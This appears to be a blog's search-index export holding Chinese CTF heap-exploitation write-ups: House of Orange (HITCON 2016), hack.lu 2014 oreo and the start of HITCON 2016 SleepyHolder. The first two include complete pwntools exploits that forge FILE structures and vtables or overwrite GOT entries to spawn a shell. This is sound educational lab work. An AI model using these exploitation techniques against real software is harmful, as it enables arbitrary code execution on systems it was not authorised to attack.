<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[堆利用学习之house of orange]]></title>
    <url>%2Fpost%2Ff8f8701e.html</url>
    <content type="text"><![CDATA[终于学到了house of orange，看了无数师傅的博客，终于马马虎虎理清了一点思路，还是得写点笔记以免忘掉。 概述house of orange是来自Hitcon CTF 2016中的一道同名题目，其中使用了一种全新的攻击手段（现在也不新了2333），攻击的主要思路是利用unsorted attack修改_IO_list_all指针，并伪造_IO_FILE_plus结构体及其vtable（虚表）来劫持控制流。直接上题目好了。。。 题目描述程序菜单：123456789+++++++++++++++++++++++++++++++++++++@ House of Orange @+++++++++++++++++++++++++++++++++++++ 1. Build the house 2. See the house 3. Upgrade the house 4. Give up +++++++++++++++++++++++++++++++++++++Your choice : 程序保护全开_(:зゝ∠)_:12345CANARY : ENABLEDFORTIFY : ENABLEDNX : ENABLEDPIE : ENABLEDRELRO : FULL 程序分析build函数： 用户输入house的名字、orange的颜色和价格，并使用两个结构体保存。 结构体：123400000000 house struc ; (sizeof=0x10, mappedto_6)00000000 orange dq ?00000008 name dq ?00000010 house ends 123400000000 orange struc ; (sizeof=0x8, mappedto_7)00000000 price dd ?00000004 color dd ?00000008 orange ends 限制了只能build四次，每次build会申请3个chunk，其中只有第二个chunk(house name)可以控制大小，且最大为0x10001234567891011121314house = (house *)malloc(0x10uLL);printf("Length of name :");size = get_num();if ( size &gt; 0x1000 ) size = 4096;house-&gt;name = (__int64)malloc(size);if ( !house-&gt;name )&#123; puts("Malloc error !!!"); exit(1);&#125;printf("Name :");get_str((void *)house-&gt;name, size);orange = (orange *)calloc(1uLL, 8uLL); upgrade函数： 修改house的name、orange的颜色和价格，只能修改最近build的house。 123456printf("Length of name :");v2 = get_num();if ( v2 &gt; 0x1000 ) v2 = 4096;printf("Name:");get_str((void *)qword_203068[1], v2); 修改name的地方没有检查size的大小，所以存在堆溢出 see函数 打印house的名字、orange的价格等，同样只能打印最近build的house。 漏洞分析泄露libc基址和堆地址发现程序中没有free函数，导致常规的堆利用方法都很难使用，这便是house of orange的核心之一——在没有free函数的情况下得到一个释放的堆块（unsorted bin），从而泄露数据。 原理考虑这么一种情况，假设在malloc时，程序中的bins里都没有合适的chunk，同时top chunk的大小已经不够用来分配这块内存了。那么此时程序将会调用sysmalloc来向系统申请更多的空间，而我们的目的则是在sysmalloc中的_int_free()，以此来获得一块释放的堆块。1234567else&#123; void *p = sysmalloc (nb, av); //调用sysmalloc来分配内存 if (p != NULL) alloc_perturb (p, bytes); return p;&#125; 对于堆来说有两种拓展方式，一是通过改变brk来拓展堆，二是通过mmap的方式。其中只有brk拓展的方式才会调用到_int_free()将老的top chunk释放掉，所以还需要满足一些条件。123456789// 如果所需分配的chunk大小大于mmap分配阈值，默认为128K，// 并且当前进程使用mmap()分配的内存块小于设定的最大值// 则将使用mmap()if (av == NULL || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) &#123; //使用mmap() &#125; 由上诉代码可知，要想使用brk拓展，需要满足chunk size &lt; 0x‭20000‬同时，在使用brk拓展之前，还会进行一系列check。12345678// 如果top chunk没有初始化，则size为0// top chunk的大小需要 &gt;= MINSIZE(有师傅的博客说在64位下是0x20)// top chunk的inuse位需要是 1// 检查是否对齐到内存页assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; pagemask) == 0)); 这里主要关注如何对齐到内存页。现代操作系统都是以内存页为单位进行内存管理的，一般内存页大小为4kb(0x1000)，那么top chunk的size加上top chunk的地址所得到的值是和0x1000对齐的。如：0x602020+0x20fe0=0x623000。 整理以上代码，所需的条件有： 分配的chunk大小小于0x‭20000，大于top chunk‬的size top chunk大小大于 MINSIZE（不能太小就行） top chunk的inuse为 1 top chunk的大小要对齐到内存页 满足了以上各种条件之后，就可以成功的调用_int_free()来释放top chunk12345/* If possible, release the rest. */if (old_size &gt;= MINSIZE)&#123; _int_free (av, old_top, 1);//调用_int_free，free old_top。&#125; 此后，原先的top chunk将被放入unsorted bin中。下一次分配时，就将会从unsorted bin中切割合适的大小，而切割下来的chunk的fd和bk的值将会是libc中的地址了，同时，若该chunk是large chunk，在fd_nextsize和bk_nextsizez中还会储存堆中的地址。由此便可以完成泄露了。 利用过程 先build一个house，通过upgrade从name溢出到top chunk，将top chunk的大小改为0xfa1（name chunk的大小为0x20） 123build(0x10, 'aaaa')payload = 'a'*0x18 + p64(0x21) + p64(0)*3 + p64(0xfa1)upgrade(0x100, payload) 12345678//内存情况：0x55e0ebd68000: 0x0000000000000000 0x0000000000000021 &lt;== house0x55e0ebd68010: 0x000055e0ebd68050 0x000055e0ebd680300x55e0ebd68020: 0x0000000000000000 0x0000000000000021 &lt;== name0x55e0ebd68030: 0x6161616161616161 0x61616161616161610x55e0ebd68040: 0x6161616161616161 0x0000000000000021 &lt;== orange0x55e0ebd68050: 0x0000001f00000008 0x00000000000000000x55e0ebd68060: 0x0000000000000000 0x0000000000000fa1 &lt;== top chunk 申请一个大于top chunk的空间，触发brk来拓展top chunk。原top chunk将会被放入unsorted bin 1build(0x1000, 'aaaa') 1234//内存情况：//因为我不是同一次运行，地址可能和前面不匹配unsortedbinall: 0x7f7ab34f37b8 (main_arena+88) —▸ 0x5598255700a0 ◂— 0x7f7ab34f37b8 再申请一个大小合适的large chunk，该chunk将会从unsorted bin中切割下来。 1build(0x400, 'a'*0x8) 123456//内存情况：pwndbg&gt; x/32gx 0x559d1a1d40c00x559d1a1d40c0: 0x0000000000000000 0x00000000000004110x559d1a1d40d0: 0x6161616161616161 0x00007f732b8fddc8 &lt;== libc0x559d1a1d40e0: 0x0000559d1a1d40c0 0x0000559d1a1d40c0 &lt;== heap0x559d1a1d40f0: 0x0000000000000000 0x0000000000000000 调用see()，输出name时，将会把libc的地址泄露出来。再调用upgrade()，把bk也全部填充为’a’，那么下一次see()就可以泄露出heap的地址。 劫持流程接下来将会涉及到IO_FILE的利用，这种方法被称为FSOP(File Stream Oriented Programming) FILE介绍 FILE在Linux系统的标准IO库中是用于描述文件的结构，称为文件流。FILE结构在程序执行fopen等函数时会进行创建。 每个FILE结构都通过一个 _IO_FILE_plus结构体来定义，结构体如下：12345struct _IO_FILE_plus&#123; _IO_FILE file; const struct _IO_jump_t *vtable;&#125;; 其中包括一个_IO_FILE结构体和一个vtable(虚表)指针。_IO_FILE结构体保存了FILE的各种信息。vtable(虚表)指针指向了一系列函数指针，稍后就会用到其中的函数。 _IO_FILE结构定义如下：123456789101112131415161718192021222324252627282930313233343536373839404142struct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;; 整个结构不用完全掌握，大概了解就行。在进程中的产生的各个_IO_FILE结构会通过其中的struct _IO_FILE *_chain;连接在一起形成一个链表，其中表头使用全局变量struct _IO_FILE_plus *_IO_list_all来表示，通过_IO_list_all就可以遍历所有_IO_FILE结构。 _IO_jump_t *vtable结构定义如下:1234567891011121314151617181920212223242526272829struct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);#if 0 get_column; set_column;#endif&#125;; 这里面保存了一系列的函数指针。 以上，主要需要了解的就是 _IO_FILE_plus、_IO_FILE、vtable3个结构以及 _IO_list_all指针的关系和及其内容。 _IO_FILE各个成员的偏移如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667_IO_FILE_plus = &#123; 'i386':&#123; 0x0:'_flags', 0x4:'_IO_read_ptr', 0x8:'_IO_read_end', 0xc:'_IO_read_base', 0x10:'_IO_write_base', 0x14:'_IO_write_ptr', 0x18:'_IO_write_end', 0x1c:'_IO_buf_base', 0x20:'_IO_buf_end', 0x24:'_IO_save_base', 0x28:'_IO_backup_base', 0x2c:'_IO_save_end', 0x30:'_markers', 0x34:'_chain', 0x38:'_fileno', 0x3c:'_flags2', 0x40:'_old_offset', 0x44:'_cur_column', 0x46:'_vtable_offset', 0x47:'_shortbuf', 0x48:'_lock', 0x4c:'_offset', 0x54:'_codecvt', 0x58:'_wide_data', 0x5c:'_freeres_list', 0x60:'_freeres_buf', 0x64:'__pad5', 0x68:'_mode', 0x6c:'_unused2', 0x94:'vtable' &#125;, 'amd64':&#123; 0x0:'_flags', 0x8:'_IO_read_ptr', 0x10:'_IO_read_end', 0x18:'_IO_read_base', 0x20:'_IO_write_base', 0x28:'_IO_write_ptr', 0x30:'_IO_write_end', 0x38:'_IO_buf_base', 0x40:'_IO_buf_end', 0x48:'_IO_save_base', 0x50:'_IO_backup_base', 0x58:'_IO_save_end', 0x60:'_markers', 0x68:'_chain', 0x70:'_fileno', 0x74:'_flags2', 0x78:'_old_offset', 0x80:'_cur_column', 0x82:'_vtable_offset', 0x83:'_shortbuf', 0x88:'_lock', 0x90:'_offset', 0x98:'_codecvt', 0xa0:'_wide_data', 0xa8:'_freeres_list', 0xb0:'_freeres_buf', 0xb8:'__pad5', 0xc0:'_mode', 0xc4:'_unused2', 0xd8:'vtable' &#125;&#125; [注]在gdb中查看这些结构的指令:123456//查看_IO_list_all指针p *_IO_list_all//查看_IO_FILE_plusp (*(struct _IO_FILE_plus *) 0x55cdf66034f0)//查看vtablep (*(struct _IO_jump_t *) 0x55cdf66034f0) unsortedbin attack根据house of orange的流程，接下来将要控制_IO_list_all指针的值，具体原因后面会讲到。这里我们采用unsortedbin attack来对它的值进行修改。 原理在从unsorted bin中取出chunk时，会执行以下代码：12345 bck = victim-&gt;bk; .../* remove from unsorted list */ unsorted_chunks(av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks(av); 这里将最后一个chunk取出，并把倒数第二个chunk的fd设置为unsorted_chunks(av)，这里unsorted_chunks(av)就是main_arena中top成员变量的地址(&amp;main_arena+88)。123456789101112131415//main_arena的结构struct malloc_state&#123; mutex_t mutex; int flags; mfastbinptr fastbinsY[NFASTBINS]; mchunkptr top; //此处的地址将被写入目标地址 mchunkptr last_remainder; ...&#125; 可以发现，如果我们将victim的bk改写为某个地址，则可以向这个地址 + 0x10的地方写入&amp;main_arena+88。因为题目程序中存在堆溢出，所以可以轻松溢出到某个chunk的bk，并将它改写。这里我们写入_IO_list_all - 0x10，这样当从unsorted bin中取出它时，就可以成功将_IO_list_all写为&amp;main_arena+88。 具体利用过程需要和后面FSOP配合。 FSOP漏洞原理 因为_IO_FILE结构使用链表的结构管理，表头由_IO_list_all维护。所以FSOP的核心思想就是劫持_IO_list_all的值并伪造链表和其中的_IO_FILE 在此之前，我们先了解一下malloc对错误信息的处理过程. 在malloc出错时，会调用malloc_printerr函数来输出错误信息 12if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)|| __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) malloc_printerr (check_action, "malloc(): memory corruption", chunk2mem (victim), av); 而malloc_printerr又会调用__libc_message; __libc_message又调用abort; abort则又调用了_IO_flush_all_lockp 最后_IO_flush_all_lockp中会调用到vtable中的_IO_OVERFLOW函数 整个流程如下图：所以如果可以控制_IO_list_all的值，同时够伪造一个_IO_FILE及其vtable并放入FILE链表中，就可以让上述流程进入我们伪造的vtable, 并调用被修改为system的_IO_OVERFLOW函数。 但是想要成功调用_IO_OVERFLOW函数还需要绕过一些阻碍12345678910111213141516171819int _IO_flush_all_lockp (int do_lock)&#123; ... fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) &#123; ... if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) ... ... fp = fp-&gt;_chain; &#125;&#125; 观察代码发现，_IO_OVERFLOW存在于if之中，根据短路原理，若要执行到_IO_OVERFLOW，就需要让前面的判断都能满足，即：12fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base 或者123_IO_vtable_offset (fp) == 0&amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base） 以上两个条件至少要满足一个，这里我们将选择第一个，只需要构造mode、_IO_write_ptr和_IO_write_base。因为这些都是我们可以伪造的_IO_FILE中的数据，所以比较容易实现。 漏洞利用在前面已经介绍过，可以通过unsortedbin attack来将_IO_list_all指针的值修改为&amp;main_arena+88。 但这还不够，因为我们很难控制main_arena中的数据，并不能在mode、_IO_write_ptr和_IO_write_base的对应偏移处构造出合适的值。 所以我们将目光转向_IO_FILE的链表特性。在前文_IO_flush_all_lockp函数的代码最后，可以发现程序通过fp = fp-&gt;_chain不断的寻找下一个_IO_FILE。 所以如果可以修改fp-&gt;_chain到一个我们伪造好的_IO_FILE的地址，那么就可以成功实现利用了。 巧妙的是，_IO_FILE结构中的chian字段对应偏移是0x68，而在&amp;main_arena+88对应偏移为0x68的地址正好是大小为0x60的small bin的bk，而这个地址的刚好是我们可以控制的。1234567891011121314151617+0x00 [ top | last_remainder ]+0x10 [ unsorted bin fd | unsorted bin bk ]+0x20 [ smallbin 0x20 fd | smallbin 0x20 bk ]+0x30 [ smallbin 0x30 fd | smallbin 0x30 bk ]+0x40 [ smallbin 0x40 fd | smallbin 0x40 bk ]+0x50 [ smallbin 0x50 fd | smallbin 0x50 bk ]+0x60 [ smallbin 0x60 fd | smallbin 0x60 bk ]pwndbg&gt; x/64gx _IO_list_all0x7fdd7442c7b8 &lt;main_arena+88&gt;: 0x00005616d200b010 0x00005616d1fe94f00x7fdd7442c7c8 &lt;main_arena+104&gt;: 0x00005616d1fe94f0 0x00007fdd7442d1900x7fdd7442c7d8 &lt;main_arena+120&gt;: 0x00007fdd7442c7c8 0x00007fdd7442c7c80x7fdd7442c7e8 &lt;main_arena+136&gt;: 0x00007fdd7442c7d8 0x00007fdd7442c7d80x7fdd7442c7f8 &lt;main_arena+152&gt;: 0x00007fdd7442c7e8 0x00007fdd7442c7e80x7fdd7442c808 &lt;main_arena+168&gt;: 0x00007fdd7442c7f8 0x00007fdd7442c7f80x7fdd7442c818 &lt;main_arena+184&gt;: 0x00005616d1fe94f0 0x00005616d1fe94f0 &lt;== 此处0x7fdd7442c828 &lt;main_arena+200&gt;: 0x00007fdd7442c818 0x00007fdd7442c818 我们如果通过溢出，将位于unsorted bin中的chunk的size修改为0x60。（注：现在unsorted bin中的chunk就是之前被释放的top chunk的一部分）那么在下一次malloc的时候，因为在其他bin中都没有合适的chunk，malloc将会进入大循环，把unsorted bin中的chunk放回到对应的small bin或large bin中（具体流程参考ctfwiki）因此，我们修改过size的chunk就会被放入大小为0x60的small bin中，同时，该small bin的fd和bk都会变为此chunk的地址。 这样，当_IO_flush_all_lockp函数通过fp-&gt;_chain寻找下一个_IO_FILE时，就会寻找到smallbin 0x60中的chunk。只要在这个chunk中伪造好_IO_FILE结构体以及vtable，把_IO_OVERFLOW设置为system，然后就可以成功getshell了。 利用过程直接构造payload 首先是padding，抵达被释放掉的top chunk。 1payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(1) + p32(0x1f) + p64(0) 接下来构造的内存具有双重身份，一是作为伪造的_IO_FILE；一是用于unsorted attack的victim chunk，因为它位于unsorted bin中。 然后开始构造_IO_FILE。因为要调用的_IO_OVERFLOW (fp, EOF)被修改后为system(fp)，所以在开头写入&#39;/bin/sh\x00&#39;，让fp = &quot;/bin/sh&quot;；又因为为了将这个chunk放入smallbin 0x60，所以将size位设置为0x61。 1fake_file = '/bin/sh\x00' + p64(0x61) 然后将bk的位置写入(IO_list_all - 0x10，用作unsorted attack 1fake_file += p64(0) + p64(IO_list_all - 0x10) 接下来的位置刚好是_IO_write_base和IO_write_ptr。前面提到过需要构造fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base 1fake_file += p64(0) + p64(1) #_IO_write_base ; _IO_write_ptr 接下来需要一段padding，直至fp-&gt;mode 1fake_file = fake_file.ljust(0xc0, '\x00') #padding 抵达fp-&gt;mode，构造fp-&gt;_mode &lt;= 0 1fake_file += p64(0) #mode &lt;= 0 然后需要设置vtable指针，将它设置到当前地址相邻往后的地址，然后继续在后面构造vtable就行了 123payload += fake_filepayload += p64(0) + p64(0) #paddingpayload += p64(heap_addr + 0x5d0) #vtable指针 构造vtable 12payload += p64(0)*3 #vtablepayload += p64(system) #将__overflow改为system 写入数据 1upgrade(0x800, payload) 触发漏洞 12p.recvuntil('Your choice : ')p.sendline('1') 调用build函数，由最初的分析可知，此处会申请3个chunk。 申请第一个chunk时，大小为0x20，因为fastbin中没有chunk，所以会进入大循环，将我们前面构造好的chunk放入smallbin 0x60。 在从unsorted bin中取出这个chunk时，又会触发unsortedbin attack，改写_IO_list_all指针。至此，所有数据都布置好了。 因为unsortedbin attack的时候破坏了unsorted bin的链表结构，所以接下来的分配过程会出现错误，系统调用malloc_printerr去打印错误信息，从而被我们劫持流程，执行到system函数。 EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#-*- coding:utf-8 -*-from pwn import *context.terminal = ['gnome-terminal', '-x', 'bash', '-c']p = process('./house_of_orange')elf = ELF('./house_of_orange')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def build(size, name): p.recvuntil('Your choice : ') p.sendline('1') p.recvuntil('Length of name :') p.sendline(str(size)) p.recvuntil('Name :') p.send(name) p.recvuntil('Price of Orange:') p.sendline('8') p.recvuntil('Color of Orange:') p.sendline('1')def see(): p.recvuntil('Your choice : ') p.sendline('2')def upgrade(size, name): p.recvuntil('Your choice : ') p.sendline('3') p.recvuntil('Length of name :') p.sendline(str(size)) p.recvuntil('Name:') p.send(name) p.recvuntil('Price of Orange: ') p.sendline('8') p.recvuntil('Color of Orange: ') p.sendline('1')build(0x10, 'aaaa')payload = 'a'*0x18 + p64(0x21) + p64(0)*3 + p64(0xfa1)upgrade(0x100, payload)#将topchunk放入unsortedbinbuild(0x1000, 'aaaa')#从unsortedbin中取出一部分topchunkbuild(0x400, 'a'*0x8)see()p.recvuntil('aaaaaaaa')libc_base = u64(p.recvline()[:-1].ljust(8, '\x00')) - 0x3C2DC8print "libc_base : %#x" % libc_base upgrade(0x400, 'a'*0x10)see()p.recvuntil('a'*0x10)heap_addr = u64(p.recvline()[:-1].ljust(8, '\x00')) - 0xc0print "heap_addr : %#x" % heap_addrsystem = libc_base + libc.symbols['system']IO_list_all = libc_base + libc.symbols['_IO_list_all']print "system : %#x" % systemprint "_IO_list_all : %#x" % IO_list_allpayload = 'a' * 0x400 #paddingpayload += p64(0) + p64(0x21) #paddingpayload += p32(1) + p32(0x1f) + p64(0) #paddingfake_file = '/bin/sh\x00' + p64(0x61) # fp; sizefake_file += p64(0) + p64(IO_list_all - 0x10) # fd; bkfake_file += p64(0) + p64(1) # _IO_write_base ; _IO_write_ptrfake_file = fake_file.ljust(0xc0, '\x00') #paddingfake_file += p64(0) # mode &lt;= 0payload += fake_filepayload += p64(0) + p64(0) #paddingpayload += p64(heap_addr + 0x5d0) #vtable指针payload += p64(0)*3 # vtablepayload += p64(system) # 将__overflow改为systemupgrade(0x800, payload)gdb.attach(p)p.recvuntil('Your choice : ')p.sendline('1')p.interactive() 程序链接house of orange 后记这篇文章写得是真的乱233333在写好exp后，运行最后会报memory corruption，我还以为出错了，又调了半天_(:зゝ∠)_，最后才反应过来程序本来就要调用malloc_printerr。。。默默输了个ls，看到回显感动得一匹。话说这exp有一定概率会失败，并不清楚原因_(:зゝ∠)_。]]></content>
      <categories>
        <category>堆利用学习</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>house_of_orange</tag>
        <tag>IO_FILE</tag>
        <tag>unsortedbin_attack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hack.lu2014-oreo writeup]]></title>
    <url>%2Fpost%2F1b661c73.html</url>
    <content type="text"><![CDATA[题目描述题目来源：hack.lu CTF 2014知识点：house of spirit挺老的一道题目了，不过是how2heap和ctfwiki上的例题。题目是一个买卖枪支的系统，同样是常规的增删查改，32位程序。12345678910Welcome to the OREO Original Rifle Ecommerce Online System!What would you like to do?1. Add new rifle2. Show added rifles3. Order selected rifles4. Leave a Message with your Order5. Show current stats6. Exit!Action: 保护如下：123456[*] &apos;/home/nick/pwn_learn/heapLearn/house_of_spirit/hack-lu2014_oreo&apos; Arch: i386-32-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE 程序概况add函数：12345678910111213v1 = head;head = (char *)malloc(56u);if ( head )&#123; *((_DWORD *)head + 13) = v1; printf("Rifle name: "); fgets(head + 25, 56, stdin); sub_80485EC(head + 25); printf("Rifle description: "); fgets(head, 56, stdin); sub_80485EC(head); ++cnt;&#125; 函数会读取名称和描述，并将名称、描述以及上一个枪支的地址一起存入结构体中，构成一个链表结构。结构体如下：1234500000000 rifle struc ; (sizeof=0x38, mappedto_5)00000000 description db 25 dup(?)00000019 name db 27 dup(?)00000034 next dd ?00000038 rifle ends 同时注意到，fgets函数读取的长度为56个字节，所以可以发生溢出。 show函数：123456for ( i = head; i; i = (rifle *)i-&gt;next )&#123; printf("Name: %s\n", i-&gt;name); printf("Description: %s\n", i); puts("===================================");&#125; 通过链表依次访问每个枪支，输出名称和描述。 Free函数(Order)：遍历链表，依次将所有枪支都free掉，然后将链表头置0 message函数：向dword_804A2A8指向的地址写入字符串。而在程序开头dword_804A2A8 = (char *)&amp;unk_804A2C0;，所以是向unk_804A2C0处写入。1234567.bss:0804A2A8 dword_804A2A8 dd ? ; DATA XREF: leave_message+23↑r.bss:0804A2A8 ; leave_message+3C↑r ....bss:0804A2AC align 20h.bss:0804A2C0 unk_804A2C0 db ? ; ; DATA XREF: main+29↑o.bss:0804A2C1 db ? ;.bss:0804A2C2 db ? ;.bss:0804A2C3 db ? ; 漏洞分析泄露libc基址因为程序通过链表来管理枪支，恰好在枪支结构体中存在溢出，所以可以通过从name溢出到next指针，将next修改到任意地址，再通过show就可以任意地址读了。这里可以通过泄露puts_got,然后通过偏移来算出libc基址。 house of spirit因为可以控制next指针，也就意味着可以在任意地方free，那么可以构造house of spirit。如果可以在massage指针dword_804A2A8处布置好一个fake chunk用于绕过free的检查，那么就可以在此处分配一个chunk，massage指针将会被控制，从而实现任意地址写。 构造fake chunk若要让dword_804A2A8在chunk内部，首先需要在它的上方构造出这个chunk的size，可以发现，在对枪支进行计数的cnt变量刚好在0x804A2A4的位置，所以只需要添加一定数量的枪支，就可以达到我们想要的size。12345678.bss:0804A2A0 dword_804A2A0 dd ? ; DATA XREF: Free+5A↑r.bss:0804A2A0 ; Free+62↑w ....bss:0804A2A4 cnt dd ? ; DATA XREF: add+C5↑r.bss:0804A2A4 ; add+CD↑w ....bss:0804A2A8 ; char *dword_804A2A8.bss:0804A2A8 dword_804A2A8 dd ? ; DATA XREF: leave_message+23↑r.bss:0804A2A8 ; leave_message+3C↑r ....bss:0804A2AC align 20h 因为一个枪支结构体的大小为0x38，加上chunk header后的size属于0x40这个fast bin，所以需要将fake chunk的size设置为0x40，也就是添加0x40个枪支然后需要绕过对next chunk的检查，通过写入message，将对应next chunk的size和prevsize都构造好。（详见exp）构造好后：1234560x804a288: 0x00000000 0x00000000 0x00000000 0x000000000x804a298: 0x00000000 0x00000000 0x00000001 0x00000041 &lt;== size0x804a2a8: 0x0804a2c0 0x00000000 0x00000000 0x00000000 &lt;== message指针0x804a2b8: 0x00000000 0x00000000 0x00000000 0x000000000x804a2c8: 0x00000000 0x00000000 0x00000000 0x000000000x804a2d8: 0x00000000 0x00000000 0x00000040 0x00000050 &lt;== prevsize size 实现任意地址写在fake chunk构造好后，就可以将dword_804A2A8写入next指针，然后free，在message指针处构造好的fake chunk将会进入fast bin。重新添加枪支，fake chunk将会从bins中取出，通过设置枪支的description，就可以修改massage指针了，此时在调用message函数就能实现任意地址写 注意 程序中没有setvbuf，所以不会及时的回显数据，在编写exp时有些时候不用recv exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p = process('./hack-lu2014_oreo')elf = ELF('./hack-lu2014_oreo')libc = ELF('/lib/i386-linux-gnu/libc-2.19.so')def add(name, description): p.sendline('1') p.sendline(name) p.sendline(description)def show(): p.sendline('2') p.recvuntil('=\n')def free(): p.sendline('3')def leaveMsg(msg): p.sendline('4') p.sendline(msg)def leak(addr): add('a'*27 + p32(addr), 'a') show() p.recvuntil('Description: ') p.recvuntil('Description: ') res = u32(p.recvuntil('\n', drop=True)[:4]) p.recvuntil('\n') return res#泄露libclibc_base = leak(elf.got['puts']) - libc.symbols['puts']system = libc_base + libc.symbols['system']print "libc_base : %#x" % libc_baseprint "system : %#x" % system#添加0x40个枪支，构造size位for _ in range(0x40-1): add('a', 'a')#将massage指针的地址写到next指针中add('a'*27 + p32(0x0804A2A8), 'a')#构造next chunk，将prevsize设为0x40，size设为0x50payload = '\x00'*0x20 + p32(0x40) + p32(0x50)leaveMsg(payload)#把fake chunk放入fast binfree()p.recvuntil('Okay order submitted!\n')#重新把fake chunk分配出来，并在description写入strlen_got，相当于将message指针改为指向strlen的got表add('a' ,p32(elf.got['strlen']))#写入message，相当于向strlen_got中写入system。#因为在leaveMsg函数中，fgets之后就会调用strlen，所以顺便就可以getshell了#这里使用分号是因为linux命令中可以使用';'来分割两条指令，所以这里相当于把/bin/sh当做第二条执行的指令了，而第一个p32(system)是个无效指令罢了leaveMsg(p32(system) + ';/bin/sh')p.interactive() 相关链接题目链接：oreowriteup参考：ctfwiki]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>writeup</tag>
        <tag>how2heap</tag>
        <tag>ctfwiki</tag>
        <tag>house_of_spirit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hitcon2016-SleepyHolder writeup]]></title>
    <url>%2Fpost%2Fe99b1303.html</url>
    <content type="text"><![CDATA[题目描述题目来源：HITCON CTF 2016知识点：unlink、double free这道题提供了3个功能，添加秘密、删除秘密、重写秘密。秘密分为3种：small、big、huge。其中huge秘密一旦写入再也不能改也不能删。题目中没有提供输出秘密的功能。123456Waking Sleepy Holder up ...Hey! Do you have any secret?I can help you to hold your secrets, and no one will be able to see it :)1.Keep secret2.Wipe secret3.Renew secret 程序保护如下123456[*] &apos;/home/nick/pwn_learn/heapLearn/fastbinAtk/Hitcon2016_SleepyHolder/SleepyHolder&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE 程序概况keep函数：1234What secret do you want to keep?1. Small secret2. Big secret3. Keep a huge secret and lock it forever 根据选择不同的secret申请不同大小的内存，分别是40、4000、400000个字节。其中每个大小的chunk只能申请一次。 wipe函数：12345678910if ( v0 == 1 )&#123; free(buf); dword_6020E0 = 0;&#125;else if ( v0 == 2 )&#123; free(qword_6020C0); dword_6020D8 = 0;&#125; 只能删除small和big两种secret。free之后没有清空指针，存在double free漏洞 renew函数：同样只能重写small和big两种secret，因为会检查是否使用的标记，所以不能UAF 漏洞分析double free因为free之后没有清空指针，所以可以造成double free漏洞。这里double free可以用于辅助unlink。 修改inuse位 